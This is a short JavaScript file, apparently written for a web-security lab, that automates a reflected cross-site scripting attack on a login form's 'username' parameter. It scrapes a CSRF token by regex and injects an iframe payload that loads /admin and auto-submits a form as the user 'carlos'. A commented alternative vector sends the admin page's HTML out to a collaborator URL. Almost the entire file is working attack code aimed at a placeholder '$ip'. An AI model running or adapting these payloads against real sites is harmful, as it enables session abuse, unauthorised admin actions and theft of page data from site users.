// This javascript helps in performing basic XXS check on a parameter fetched from a vulnerable site and form paramter "username"
// This also helps in submitting a form using javascript

// Eg:
// contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">

// Another XSS vector
// username="><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">


// Regex extraction of parameter:
// text.match(/csrf" value="([^"]+)"/)[1];

function xss(url, text, vector) {
    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
  }
  


function fetchUrl(url){
    fetch(url).then(r=>r.text().then(text=>
    {
      xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
    }
    ))
  }
  
  fetchUrl("http://$ip");